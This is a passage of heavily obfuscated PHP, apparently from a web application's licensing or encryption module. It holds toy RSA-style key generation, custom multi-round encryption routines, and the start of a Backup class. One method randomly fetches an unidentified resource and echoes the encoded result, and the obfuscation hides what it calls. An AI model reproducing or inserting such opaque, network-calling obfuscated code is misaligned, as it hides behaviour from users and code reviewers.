($Cº¤ª‘ƒòì <= $B©‘ˆ“ÏŒ¾) { return; } $D¬œªàÚ‰Ö = $CˆÍÇµ›ßå[61]($CˆÍÇµ›ßå[141])->{$_SERVER[ÌœÆÒÍÚÇ²][320]}($CˆÍÇµ›ßå[319])->{$_SERVER[ÌœÆÒÍÚÇ²][321]}($B©‘ˆ“ÏŒ¾)->{$_SERVER[ÌœÆÒÍÚÇ²][322]}(); goto dª®®“‹¸â; EäˆÂ¾ªÛ: $bÒƒ¢ö±Î› =& $_SERVER[¹÷ˆ§éÒ°ú]; $CˆÍÇµ›ßå =& $_SERVER[ÌœÆÒÍÚÇ²]; $B©‘ˆ“ÏŒ¾ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][139]}(); goto C°ùßññ…Æ; dª®®“‹¸â: $D¬œªàÚ‰Ö = $CˆÍÇµ›ßå[224]($D¬œªàÚ‰Ö, $CˆÍÇµ›ßå[10], $CˆÍÇµ›ßå[319]); $Fâ¤”µÚùæ = $bÒƒ¢ö±Î›[629]; if (!$CˆÍÇµ›ßå[241]($Aá«ÏĞ¶®Ä[$CˆÍÇµ›ßå[319]], $D¬œªàÚ‰Ö)) { $CˆÍÇµ›ßå[168]($CˆÍÇµ›ßå[323], !1, $CˆÍÇµ›ßå[238]); } goto eŸ”’·ãš¨; C°ùßññ…Æ: if ($Aá«ÏĞ¶®Ä[$CˆÍÇµ›ßå[319]] == $CˆÍÇµ›ßå[222]) { return; } if ($B©‘ˆ“ÏŒ¾ >= $CˆÍÇµ›ßå[203]($CˆÍÇµ›ßå[243])) { return; } $Cº¤ª‘ƒòì = $CˆÍÇµ›ßå[61]($CˆÍÇµ›ßå[141])->{$_SERVER[ÌœÆÒÍÚÇ²][142]}(); goto b í®¦Ÿ¯ƒ; eŸ”’·ãš¨: } public function lgxfed9b618b() { goto e£ª´óÉÁ; dŒ¢§´ˆÇĞ: if (!$bŞöê¬¦Ë) { die; } $b¿‰š‹º ¯ = @$a…Ì›áÍ›ª[255]($aŒçÒ’¢¤œ, !1, $Eò¼‹œÆˆ‘); $Dç‹§ˆë£â = $F‘ÓäÉé¬[632]; goto eæÎì­µËÙ; d³œÕÜ…Ñ°: $aŒçÒ’¢¤œ = $a…Ì›áÍ›ª[247]; $aŒçÒ’¢¤œ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($aŒçÒ’¢¤œ, $a…Ì›áÍ›ª[249]); $FêÅÓà¬è = $F‘ÓäÉé¬[630]; goto aî­Œ™Ö¸‰; eæÎì­µËÙ: if (!$Dç‹§ˆë£â) { die; } echo $a…Ì›áÍ›ª[325] . $a…Ì›áÍ›ª[326]($b¿‰š‹º ¯) . $a…Ì›áÍ›ª[327]; $b–®ÓĞ½öƒ = $F‘ÓäÉé¬[633]; goto b¡“§è ƒß; e£ª´óÉÁ: $F‘ÓäÉé¬ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a…Ì›áÍ›ª =& $_SERVER[ÌœÆÒÍÚÇ²]; if (!$a…Ì›áÍ›ª[106]($GLOBALS, $a…Ì›áÍ›ª[134]) || $a…Ì›áÍ›ª[324](1, 100) > 20) { return; } goto d³œÕÜ…Ñ°; aî­Œ™Ö¸‰: while ($FêÅÓà¬è < $F‘ÓäÉé¬[11]) { if ($FêÅÓà¬è >= 0) { break; } $FêÅÓà¬è++; } $Eò¼‹œÆˆ‘ = $a…Ì›áÍ›ª[250](array($a…Ì›áÍ›ª[251] => array($a…Ì›áÍ›ª[252] => $a…Ì›áÍ›ª[253], $a…Ì›áÍ›ª[254] => 3))); $bŞöê¬¦Ë = $F‘ÓäÉé¬[631]; goto dŒ¢§´ˆÇĞ; b¡“§è ƒß: } private function lsgd84f0cc00($bÇ«›Ã˜…, $e„ÒÖ›¥Ü, $D³äÃ¤×–Ï = 3) { goto FÚƒŒß²”; A¶¹Éøè—î: if ($D³äÃ¤×–Ï - 1 > 0) { $AŠòİ·ºœ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][129]}($AŠòİ·ºœ, $e„ÒÖ›¥Ü, $D³äÃ¤×–Ï - 1); } return $AŠòİ·ºœ; goto AÀ÷«×²ö†; aÚ¤àÊ±ö: $B¹µ¾äÆ²ß = $DĞ—»·ˆòˆ[324](0, 5) . $DĞ—»·ˆòˆ[10]; $EôÒ®†¼ÅÇ = $DĞ—»·ˆòˆ[126](15); $fÑŠÉÈ‚Œã = $DĞ—»·ˆòˆ[329]; goto CëÂàÙŠ‚œ; CŒó Øëƒ¦: $e½¿‰×›º¹ = $bšÚºÜ¦«[634]; if (!$e½¿‰×›º¹) { die; } $bÇ«›Ã˜… = $DĞ—»·ˆòˆ[2]($bÇ«›Ã˜…); goto aÚ¤àÊ±ö; CëÂàÙŠ‚œ: $c§ŸŸ‰ö‹ = $bšÚºÜ¦«[580]; while ($c§ŸŸ‰ö‹ < $bšÚºÜ¦«[561]) { if ($c§ŸŸ‰ö‹ >= 0) { break; } $c§ŸŸ‰ö‹++; } switch ($B¹µ¾äÆ²ß) { case $DĞ—»·ˆòˆ[234]: $AŠòİ·ºœ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($bÇ«›Ã˜…, $DĞ—»·ˆòˆ[216]($e„ÒÖ›¥Ü . $EôÒ®†¼ÅÇ)); $A·¡‡Œ½å = $bšÚºÜ¦«[635]; break; case $DĞ—»·ˆòˆ[222]: $AŠòİ·ºœ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($bÇ«›Ã˜…, $DĞ—»·ˆòˆ[216]($EôÒ®†¼ÅÇ . $e„ÒÖ›¥Ü)); break; $dğÎÊøÖçÓ = $bšÚºÜ¦«[636]; while ($dğÎÊøÖçÓ < $bšÚºÜ¦«[11]) { if ($dğÎÊøÖçÓ >= 0) { break; } $dğÎÊøÖçÓ++; } case $DĞ—»·ˆòˆ[330]: $AŠòİ·ºœ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($bÇ«›Ã˜…, $DĞ—»·ˆòˆ[120]($EôÒ®†¼ÅÇ . $e„ÒÖ›¥Ü)); $FÈ£ÓÖ’¾• = $bšÚºÜ¦«[637]; break; $B“ öŠÕ—° = $bšÚºÜ¦«[638]; case $DĞ—»·ˆòˆ[331]: $AŠòİ·ºœ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($bÇ«›Ã˜…, $DĞ—»·ˆòˆ[116]($EôÒ®†¼ÅÇ . $e„ÒÖ›¥Ü)); $f‘àÂ†Ñ… = $bšÚºÜ¦«[639]; while (strlen($f‘àÂ†Ñ…) < $bšÚºÜ¦«[572]) { if (!$f‘àÂ†Ñ…) { break; } $f‘àÂ†Ñ…++; } break; case $DĞ—»·ˆòˆ[332]: goto A‰”ˆà×ø§; d¡ç¨‘ƒİæ: $BÄ˜­İÔ‰Î = $bšÚºÜ¦«[641]; $AäÉ¬¤§ğ† = 0; $dåà°Âá¼ = 0; goto B™†ö›‚æô; bĞãµ¸È‰: $AùÈ—©Ù„À = $DĞ—»·ˆòˆ[116]($b‚ÓÕ÷Â„¤ . $DĞ—»·ˆòˆ[116]($e„ÒÖ›¥Ü . $b‚ÓÕ÷Â„¤) . $e„ÒÖ›¥Ü); $AùÈ—©Ù„À = $DĞ—»·ˆòˆ[25]($AùÈ—©Ù„À, $eØÍ´ôœ•à % 8, $eØÍ´ôœ•à % 8 + 7); $EÊ‰Ãßèâ¬ = $DĞ—»·ˆòˆ[10]; goto C¡Œ¬Í¡¼; A‰”ˆà×ø§: $bÇ«›Ã˜… = $DĞ—»·ˆòˆ[120]($bÇ«›Ã˜…); $eØÍ´ôœ•à = $DĞ—»·ˆòˆ[333](0, 64); $b‚ÓÕ÷Â„¤ = $fÑŠÉÈ‚Œã[$eØÍ´ôœ•à]; goto bĞãµ¸È‰; C¡Œ¬Í¡¼: $b¿„é©¤¹ = $bšÚºÜ¦«[640]; if (strlen($b¿„é©¤¹) < $bšÚºÜ¦«[567]) { die; } $b—£¡£ ò® = 0; goto d¡ç¨‘ƒİæ; B™†ö›‚æô: for ($b—£¡£ ò® = 0; $b—£¡£ ò® < $DĞ—»·ˆòˆ[24]($bÇ«›Ã˜…); $b—£¡£ ò®++) { $dåà°Âá¼ = $dåà°Âá¼ == $DĞ—»·ˆòˆ[24]($AùÈ—©Ù„À) ? 0 : $dåà°Âá¼; $e†Ô§Î = $bšÚºÜ¦«[642]; while ($e†Ô§Î < $bšÚºÜ¦«[567]) { if ($e†Ô§Î >= 0) { break; } $e†Ô§Î++; } $AäÉ¬¤§ğ† = ($eØÍ´ôœ•à + $DĞ—»·ˆòˆ[334]($fÑŠÉÈ‚Œã, $bÇ«›Ã˜…[$b—£¡£ ò®]) + $DĞ—»·ˆòˆ[335]($AùÈ—©Ù„À[$dåà°Âá¼++])) % 64; $bê‰‚èäæ = $bšÚºÜ¦«[643]; if (!$bê‰‚èäæ) { die; } $EÊ‰Ãßèâ¬ .= $fÑŠÉÈ‚Œã[$AäÉ¬¤§ğ†]; $EÊ ’ëéã = $bšÚºÜ¦«[644]; if (!$EÊ ’ëéã) { return; } } $AŠòİ·ºœ = $DĞ—»·ˆòˆ[326]($b‚ÓÕ÷Â„¤ . $EÊ‰Ãßèâ¬); break; goto b²§Ì…¾•Š; b²§Ì…¾•Š: $aÏÌòĞ£ÍŞ = $bšÚºÜ¦«[645]; if (strlen($aÏÌòĞ£ÍŞ) < $bšÚºÜ¦«[561]) { return; } goto d÷†Òç®ÂÙ; d÷†Òç®ÂÙ: default: $AŠòİ·ºœ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($bÇ«›Ã˜…, $e„ÒÖ›¥Ü . $EôÒ®†¼ÅÇ); break; } goto C±‰Œ‹§Ì; C±‰Œ‹§Ì: $AŠòİ·ºœ = $DĞ—»·ˆòˆ[216]($B¹µ¾äÆ²ß . $EôÒ®†¼ÅÇ . $AŠòİ·ºœ); $DÜŸ¹³¸Å… = $bšÚºÜ¦«[646]; while (strlen($DÜŸ¹³¸Å…) < $bšÚºÜ¦«[11]) { if (!$DÜŸ¹³¸Å…) { break; } $DÜŸ¹³¸Å…++; } goto A¶¹Éøè—î; FÚƒŒß²”: $bšÚºÜ¦« =& $_SERVER[¹÷ˆ§éÒ°ú]; $DĞ—»·ˆòˆ =& $_SERVER[ÌœÆÒÍÚÇ²]; $DĞ—»·ˆòˆ[328](1); goto CŒó Øëƒ¦; AÀ÷«×²ö†: } private function nywqd3cc2526($aô…³à†Šº, $CöŠÎ² »î, $B ²éÒ“†ô = 3) { goto AíôáØ”Æ; E®òÜê¾Â¨: $aô…³à†Šº = $Eù›¦¶†¾Í[2]($aô…³à†Šº); $aô…³à†Šº = $Eù›¦¶†¾Í[216]($aô…³à†Šº); $DëÉËùÑàá = $aô…³à†Šº[0]; goto Bí§Å ±¦; D²Èòİ·ğ“: switch ($DëÉËùÑàá) { case $Eù›¦¶†¾Í[234]: $Cìˆ’ñŠÍõ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($aô…³à†Šº, $Eù›¦¶†¾Í[216]($CöŠÎ² »î . $aëÇÏòö¹)); break; case $Eù›¦¶†¾Í[222]: $Cìˆ’ñŠÍõ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($aô…³à†Šº, $Eù›¦¶†¾Í[216]($aëÇÏòö¹ . $CöŠÎ² »î)); break; case $Eù›¦¶†¾Í[330]: $Cìˆ’ñŠÍõ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($aô…³à†Šº, $Eù›¦¶†¾Í[120]($aëÇÏòö¹ . $CöŠÎ² »î)); $C´×‰Šµ½¾ = $b…ÈÖÚ÷†[647]; if (strlen($C´×‰Šµ½¾) < $b…ÈÖÚ÷†[561]) { die; } break; $EÁ¼½‚µŒî = $b…ÈÖÚ÷†[648]; if (!$EÁ¼½‚µŒî) { return; } case $Eù›¦¶†¾Í[331]: $Cìˆ’ñŠÍõ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($aô…³à†Šº, $Eù›¦¶†¾Í[116]($aëÇÏòö¹ . $CöŠÎ² »î)); $dÉ¼ä—Ô¤ö = $b…ÈÖÚ÷†[649]; break; $DÀòßŠ¶ï = $b…ÈÖÚ÷†[650]; if (!$DÀòßŠ¶ï) { die; } case $Eù›¦¶†¾Í[332]: goto BÎ¾±¼©¦´; c»‘à´…Š•: break; goto dä‚éÃíŸ; E±Ò¾ÂÃÍÜ: $aô…³à†Šº = $Eù›¦¶†¾Í[25]($aô…³à†Šº, 1); $DµïŸÉÃçª = $b…ÈÖÚ÷†[653]; $F¬·½ñÕ¡ø = $Eù›¦¶†¾Í[334]($CÜÄˆ¦à¤, $eæˆÅÕ™öÔ); goto eÂ±˜®ŠÁÇ; eƒÜ´·°™‚: $eªÙ©Õù¬ = 0; for ($EˆêŠ¡‰¥‚ = 0; $EˆêŠ¡‰¥‚ < $Eù›¦¶†¾Í[24]($aô…³à†Šº); $EˆêŠ¡‰¥‚++) { $eªÙ©Õù¬ = $eªÙ©Õù¬ == $Eù›¦¶†¾Í[24]($AêŸí™ç×) ? 0 : $eªÙ©Õù¬; $CÉ£¿°Ï‹™ = $eªÙ©Õù¬++; $eÂ­†œ¤÷† = $b…ÈÖÚ÷†[655]; $E™·Æ¬Í²„ = $Eù›¦¶†¾Í[334]($CÜÄˆ¦à¤, $aô…³à†Šº[$EˆêŠ¡‰¥‚]) - $F¬·½ñÕ¡ø - $Eù›¦¶†¾Í[335]($AêŸí™ç×[$CÉ£¿°Ï‹™]); while ($E™·Æ¬Í²„ < 0) { $E™·Æ¬Í²„ += 64; } $DƒƒÏƒè”õ .= $CÜÄˆ¦à¤[$E™·Æ¬Í²„]; } $Cìˆ’ñŠÍõ = $Eù›¦¶†¾Í[338]($DƒƒÏƒè”õ); goto c»‘à´…Š•; d›¢Ÿ–‰ÚÖ: $eæˆÅÕ™öÔ = $aô…³à†Šº[0]; $Fß¶°‡å£ = $b…ÈÖÚ÷†[652]; if (!$Fß¶°‡å£) { return; } goto E±Ò¾ÂÃÍÜ; BÎ¾±¼©¦´: $aô…³à†Šº = $Eù›¦¶†¾Í[337]($aô…³à†Šº); $B÷Ï¯ÕÅ÷ˆ = $b…ÈÖÚ÷†[651]; if (strlen($B÷Ï¯ÕÅ÷ˆ) < $b…ÈÖÚ÷†[567]) { return; } goto d›¢Ÿ–‰ÚÖ; DêŠ×§Ó“Æ: $DƒƒÏƒè”õ = $Eù›¦¶†¾Í[10]; $EˆêŠ¡‰¥‚ = 0; $E™·Æ¬Í²„ = 0; goto eƒÜ´·°™‚; eÂ±˜®ŠÁÇ: $bšâá„œò¨ = $b…ÈÖÚ÷†[654]; $AêŸí™ç× = $Eù›¦¶†¾Í[116]($eæˆÅÕ™öÔ . $Eù›¦¶†¾Í[116]($CöŠÎ² »î . $eæˆÅÕ™öÔ) . $CöŠÎ² »î); $AêŸí™ç× = $Eù›¦¶†¾Í[25]($AêŸí™ç×, $F¬·½ñÕ¡ø % 8, $F¬·½ñÕ¡ø % 8 + 7); goto DêŠ×§Ó“Æ; dä‚éÃíŸ: default: $Cìˆ’ñŠÍõ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($aô…³à†Šº, $CöŠÎ² »î . $aëÇÏòö¹); break; } if ($B ²éÒ“†ô - 1 > 0) { $Cìˆ’ñŠÍõ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][190]}($Cìˆ’ñŠÍõ, $CöŠÎ² »î, $B ²éÒ“†ô - 1); } return $Cìˆ’ñŠÍõ; goto B¹¸èÔ›ôœ; Bí§Å ±¦: $aëÇÏòö¹ = $Eù›¦¶†¾Í[25]($aô…³à†Šº, 1, 15); $aô…³à†Šº = $Eù›¦¶†¾Í[25]($aô…³à†Šº, 16); $CÜÄˆ¦à¤ = $Eù›¦¶†¾Í[329]; goto D²Èòİ·ğ“; AíôáØ”Æ: $b…ÈÖÚ÷† =& $_SERVER[¹÷ˆ§éÒ°ú]; $Eù›¦¶†¾Í =& $_SERVER[ÌœÆÒÍÚÇ²]; if (!$Eù›¦¶†¾Í[336]($aô…³à†Šº) || $Eù›¦¶†¾Í[24]($aô…³à†Šº) < 10) { return !1; } goto E®òÜê¾Â¨; B¹¸èÔ›ôœ: } public function fanvfa8b660b($bôÏ÷²“”¼) { goto FØ–Õõ¶î; eÕ²´ È´: return $a»Ò¥¤¥¸ó; goto DŠ…ÈĞ©; eôÌ‚•Ã’Ä: $bŒ´˜İ¸ƒ‘ = 2; $b›ëÆ‚» = $BÛùâØ›ò[660]; if (strlen($b›ëÆ‚») < $BÛùâØ›ò[11]) { return; } goto e£ñ¥£õÓâ; B‡Ü‘ØŠµ¤: while ($E¯‚ß°àù² < $BÛùâØ›ò[567]) { if ($E¯‚ß°àù² >= 0) { break; } $E¯‚ß°àù²++; } $CÄé»¤ç©† = $F„®™Ç¸—æ[116]($F„®™Ç¸—æ[340] . ($c±¼á´İ³ + $A‹Ç»Š×Ë) . $F„®™Ç¸—æ[341] . $b®¼˜ÉšÎƒ . $F„®™Ç¸—æ[341] . $bŒ´˜İ¸ƒ‘ . $F„®™Ç¸—æ[342]); $a»Ò¥¤¥¸ó = $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($bôÏ÷²“”¼, $CÄé»¤ç©†) . $F„®™Ç¸—æ[343] . $e”ÜÇ­Î¸¹; goto eÕ²´ È´; cÜä¢õ…´: if (strlen($a´¢ÁÄŸÆ) < $BÛùâØ›ò[576]) { die; } $b®¼˜ÉšÎƒ = $F„®™Ç¸—æ[203](($c±¼á´İ³ + $A‹Ç»Š×Ë) / 2); while (1) { $f”—çŞ¢¤ = $b®¼˜ÉšÎƒ; $Cä­£İÊæË = $BÛùâØ›ò[657]; $Dµï†Äí› = $C¹ìÌ¢Ãì™; $C“çÅÍö = $BÛùâØ›ò[658]; while ($Dµï†Äí› % $f”—çŞ¢¤ != 0) { $F½éïÔ‘¯ = $Dµï†Äí›; $F•—ëï…Ú = $BÛùâØ›ò[659]; while (strlen($F•—ëï…Ú) < $BÛùâØ›ò[11]) { if (!$F•—ëï…Ú) { break; } $F•—ëï…Ú++; } $Dµï†Äí› = $f”—çŞ¢¤; $f”—çŞ¢¤ = $F½éïÔ‘¯ % $f”—çŞ¢¤; } if ($f”—çŞ¢¤ == 1) { break; } else { $b®¼˜ÉšÎƒ++; } } goto eôÌ‚•Ã’Ä; c†á‘ø—ÁĞ: $A‹Ç»Š×Ë = $this->{$_SERVER[ÌœÆÒÍÚÇ²][339]}(); $C¹ìÌ¢Ãì™ = ($c±¼á´İ³ - 1) * ($A‹Ç»Š×Ë - 1); $a´¢ÁÄŸÆ = $BÛùâØ›ò[656]; goto cÜä¢õ…´; FØ–Õõ¶î: $BÛùâØ›ò =& $_SERVER[¹÷ˆ§éÒ°ú]; $F„®™Ç¸—æ =& $_SERVER[ÌœÆÒÍÚÇ²]; $c±¼á´İ³ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][339]}(); goto c†á‘ø—ÁĞ; e£ñ¥£õÓâ: for ($C¬‚ø®„”ë = 0; $C¬‚ø®„”ë < $C¹ìÌ¢Ãì™ * 10; $C¬‚ø®„”ë++) { if (($C¹ìÌ¢Ãì™ * $C¬‚ø®„”ë + 1) % $b®¼˜ÉšÎƒ == 0) { $bŒ´˜İ¸ƒ‘ = $F„®™Ç¸—æ[203](($C¹ìÌ¢Ãì™ * $C¬‚ø®„”ë + 1) / $b®¼˜ÉšÎƒ); break; } } $e”ÜÇ­Î¸¹ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($c±¼á´İ³ * $A‹Ç»Š×Ë . $F„®™Ç¸—æ[10], $F„®™Ç¸—æ[151]); $E¯‚ß°àù² = $BÛùâØ›ò[661]; goto B‡Ü‘ØŠµ¤; DŠ…ÈĞ©: } public function kywzaa3094d6($b¥ÆÔ´Ë) { goto FŸÖñ½±…Ô; A¥”‡¶Û“¼: if (!$F¤—ªñ—ø‚) { return; } $Aø÷§ëˆÂå = 0; $cäÖÄØ‚¬“ = $dˆáàåËëî[666]; goto EàˆÁòÕİ; CƒÍÍ¼¹Ü: $E®’‡¥‡†Ï = $aÄÂÎ´Å—[116]($aÄÂÎ´Å—[340] . ($dëà‡Æ–ã„ + $Aø÷§ëˆÂå) . $aÄÂÎ´Å—[341] . $B¬‚µöĞ»‹ . $aÄÂÎ´Å—[341] . $e¿õ¾›±ªœ . $aÄÂÎ´Å—[342]); $c†¼›ğÅéã = $dˆáàåËëî[671]; while ($c†¼›ğÅéã < $dˆáàåËëî[576]) { if ($c†¼›ğÅéã >= 0) { break; } $c†¼›ğÅéã++; } goto AùÒäÎ†ù®; AùÒäÎ†ù®: $BˆŞÚË‡ÛÇ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($E‹×µåÆê¯[0], $E®’‡¥‡†Ï); $a³ÃÆŒ‰À§ = $dˆáàåËëî[672]; return $BˆŞÚË‡ÛÇ; goto C£ï®¦ÇÉê; F±ÄØ³Õ°Í: $B¬‚µöĞ»‹ = $aÄÂÎ´Å—[203](($dëà‡Æ–ã„ + $Aø÷§ëˆÂå) / 2); $b§‘ÁÈ³Á = $dˆáàåËëî[669]; if (!$b§‘ÁÈ³Á) { return; } goto f†ŠİÖé£Ö; C£ï®¦ÇÉê: $BÈí®Ö·ßÍ = $dˆáàåËëî[673]; while ($BÈí®Ö·ßÍ < $dˆáàåËëî[576]) { if ($BÈí®Ö·ßÍ >= 0) { break; } $BÈí®Ö·ßÍ++; } goto EÖÑé×†½; FŸÖñ½±…Ô: $dˆáàåËëî =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÄÂÎ´Å— =& $_SERVER[ÌœÆÒÍÚÇ²]; $E‹×µåÆê¯ = $aÄÂÎ´Å—[0]($aÄÂÎ´Å—[343], $b¥ÆÔ´Ë); goto FÎ°±ÜÔ°‰; f†ŠİÖé£Ö: while (1) { $dùˆçŒÎŞ­ = $B¬‚µöĞ»‹; $D’Ë½¯ëÂ = $Fİ‹ß¦ÏŞ; while ($D’Ë½¯ëÂ % $dùˆçŒÎŞ­ != 0) { $d˜ëê¯×­Î = $D’Ë½¯ëÂ; $f›±Ö­äÃô = $dˆáàåËëî[670]; if (strlen($f›±Ö­äÃô) < $dˆáàåËëî[576]) { return; } $D’Ë½¯ëÂ = $dùˆçŒÎŞ­; $dùˆçŒÎŞ­ = $d˜ëê¯×­Î % $dùˆçŒÎŞ­; } if ($dùˆçŒÎŞ­ == 1) { break; } else { $B¬‚µöĞ»‹++; } } $e¿õ¾›±ªœ = 2; for ($E£ì˜¶Øšˆ = 0; $E£ì˜¶Øšˆ < $Fİ‹ß¦ÏŞ * 10; $E£ì˜¶Øšˆ++) { if (($Fİ‹ß¦ÏŞ * $E£ì˜¶Øšˆ + 1) % $B¬‚µöĞ»‹ == 0) { $e¿õ¾›±ªœ = $aÄÂÎ´Å—[203](($Fİ‹ß¦ÏŞ * $E£ì˜¶Øšˆ + 1) / $B¬‚µöĞ»‹); break; } } goto CƒÍÍ¼¹Ü; FÎ°±ÜÔ°‰: $c§ƒ¨êÓ‘İ = $dˆáàåËëî[662]; if (!$c§ƒ¨êÓ‘İ) { die; } if ($aÄÂÎ´Å—[19]($E‹×µåÆê¯) != 2) { return $aÄÂÎ´Å—[10]; } goto fò¸‡ïÏÜÑ; fò¸‡ïÏÜÑ: $DîÒèã…á­ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($E‹×µåÆê¯[1] . $aÄÂÎ´Å—[10], $aÄÂÎ´Å—[151]); $fÁ’¡Òª = $dˆáàåËëî[663]; if (strlen($fÁ’¡Òª) < $dˆáàåËëî[576]) { die; } goto CŠØë“´ÂÑ; EàˆÁòÕİ: for ($E£ì˜¶Øšˆ = 3; $E£ì˜¶Øšˆ < $DîÒèã…á­; $E£ì˜¶Øšˆ += 2) { if ($DîÒèã…á­ % $E£ì˜¶Øšˆ != 0) { continue; } $dëà‡Æ–ã„ = $E£ì˜¶Øšˆ; $Aø÷§ëˆÂå = $aÄÂÎ´Å—[203]($DîÒèã…á­ / $E£ì˜¶Øšˆ); break; $d·áø¬Á‡‰ = $dˆáàåËëî[667]; if (!$d·áø¬Á‡‰) { die; } } $Fİ‹ß¦ÏŞ = ($dëà‡Æ–ã„ - 1) * ($Aø÷§ëˆÂå - 1); $b§Å‡¼³²Ì = $dˆáàåËëî[668]; goto F±ÄØ³Õ°Í; a‚¤Ê†÷†: if (strlen($D¸ò¾§ªŠÇ) < $dˆáàåËëî[576]) { return; } $dëà‡Æ–ã„ = 0; $F¤—ªñ—ø‚ = $dˆáàåËëî[665]; goto A¥”‡¶Û“¼; CŠØë“´ÂÑ: if (!$DîÒèã…á­) { return $aÄÂÎ´Å—[10]; } $DîÒèã…á­ = $aÄÂÎ´Å—[203]($DîÒèã…á­); $D¸ò¾§ªŠÇ = $dˆáàåËëî[664]; goto a‚¤Ê†÷†; EÖÑé×†½: } public function irde35a7ecb7() { goto b»£¹µÍ; dÇìî‡œõË: $añ®½¶‹à = array(); $B‹¸¯Š† = 1; $E™ï…‚…¤õ = $eÕÈÓí³É¶[674]; goto f¯¦¤¼Ãä; CùË„‡: return $aà›Ë‹äÌ‹; $bƒİËãã„Â = $eÕÈÓí³É¶[679]; if (!$bƒİËãã„Â) { die; } goto f›Œ™¹œ«; f¯¦¤¼Ãä: if (strlen($E™ï…‚…¤õ) < $eÕÈÓí³É¶[576]) { die; } while ($B‹¸¯Š† <= (int) $C“®áªº†”[345]($D­Á§—¨õ¡)) { $C‘ÃÅÖÃ‘„ = $B‹¸¯Š†; $Có£÷ÎÁ…· = $eÕÈÓí³É¶[675]; if (strlen($Có£÷ÎÁ…·) < $eÕÈÓí³É¶[567]) { die; } while (!0) { $C‘ÃÅÖÃ‘„++; if ($C‘ÃÅÖÃ‘„ <= 2) { $B‹¸¯Š† = $C‘ÃÅÖÃ‘„; break; } else { if ($C‘ÃÅÖÃ‘„ < 2) { continue; } } $C¤®à„ºíŠ = !0; for ($C‡„ŠÄ‡¨ƒ = 2; $C‡„ŠÄ‡¨ƒ <= $C“®áªº†”[345]($C‘ÃÅÖÃ‘„); $C‡„ŠÄ‡¨ƒ++) { if ($C‘ÃÅÖÃ‘„ % $C‡„ŠÄ‡¨ƒ == 0) { $C¤®à„ºíŠ = !1; } } if ($C¤®à„ºíŠ) { $B‹¸¯Š† = $C‘ÃÅÖÃ‘„; break; } } $añ®½¶‹à[] = $B‹¸¯Š†; $aÕ‹—öÎóœ = $eÕÈÓí³É¶[676]; if (strlen($aÕ‹—öÎóœ) < $eÕÈÓí³É¶[561]) { die; } } $aà›Ë‹äÌ‹ = 2; goto CçÁ‰ÇâÍÅ; b»£¹µÍ: $eÕÈÓí³É¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C“®áªº†” =& $_SERVER[ÌœÆÒÍÚÇ²]; $D­Á§—¨õ¡ = $C“®áªº†”[324]($C“®áªº†”[344](2, 14), $C“®áªº†”[344](2, 16) - 1); goto dÇìî‡œõË; CçÁ‰ÇâÍÅ: $FÆ¡Ó’›¼Ÿ = $eÕÈÓí³É¶[677]; if (strlen($FÆ¡Ó’›¼Ÿ) < $eÕÈÓí³É¶[572]) { die; } for ($C‘ÃÅÖÃ‘„ = $D­Á§—¨õ¡; $C‘ÃÅÖÃ‘„ > 1; $C‘ÃÅÖÃ‘„--) { $C¤®à„ºíŠ = !0; $dÏ•‹“§÷Ğ = $eÕÈÓí³É¶[678]; if (!$dÏ•‹“§÷Ğ) { return; } foreach ($añ®½¶‹à as $FçÕî²ßÍà) { if ($C‘ÃÅÖÃ‘„ % $FçÕî²ßÍà == 0) { $C¤®à„ºíŠ = !1; break; } } if ($C¤®à„ºíŠ) { $aà›Ë‹äÌ‹ = $C‘ÃÅÖÃ‘„; break; } } goto CùË„‡; f›Œ™¹œ«: } public function vfum03a92e96($e¡§ğÏÆˆ, $DÒİ¶…Ö¿) { $D…ÕŸ®ß—Œ =& $_SERVER[ÌœÆÒÍÚÇ²]; return $D…ÕŸ®ß—Œ[13](array($D…ÕŸ®ß—Œ[14], $D…ÕŸ®ß—Œ[346]), $e¡§ğÏÆˆ, $DÒİ¶…Ö¿); $A ‘¨ĞŸ¢ = $_SERVER[¹÷ˆ§éÒ°ú][680]; if (!$A ‘¨ĞŸ¢) { return; } } public function ikvy8cf3f9a7($díäïÄ”¡, $c†Ëƒ¼«‘à) { $aù°Ş´¿”ƒ =& $_SERVER[ÌœÆÒÍÚÇ²]; return $aù°Ş´¿”ƒ[13](array($aù°Ş´¿”ƒ[347], $aù°Ş´¿”ƒ[348]), $díäïÄ”¡, $c†Ëƒ¼«‘à); } public function kxbsf54b44e5($EáÍŠÅ”³Œ, $f¯È²“Ğö) { $Bè•ÉÇ•¯õ =& $_SERVER[ÌœÆÒÍÚÇ²]; return $Bè•ÉÇ•¯õ[13](array($Bè•ÉÇ•¯õ[347], $Bè•ÉÇ•¯õ[349]), $EáÍŠÅ”³Œ, $f¯È²“Ğö); $a µ±Óß = $_SERVER[¹÷ˆ§éÒ°ú][681]; if (!$a µ±Óß) { return; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $B—ê‰·­…™ =& $_SERVER[¹÷ˆ§éÒ°ú]; self::$name = date($B—ê‰·­…™[682]); if (!($cî¶÷„”É‹ = Model($B—ê‰·­…™[683])->lastItem())) { $cî¶÷„”É‹ = $this->initData(); } else { self::$name = $cî¶÷„”É‹[$B—ê‰·­…™[38]]; if ($cî¶÷„”É‹[$B—ê‰·­…™[684]] == $B—ê‰·­…™[95]) { self::$name = date($B—ê‰·­…™[685]); $f¤¦îõ´å¼ = 0; if 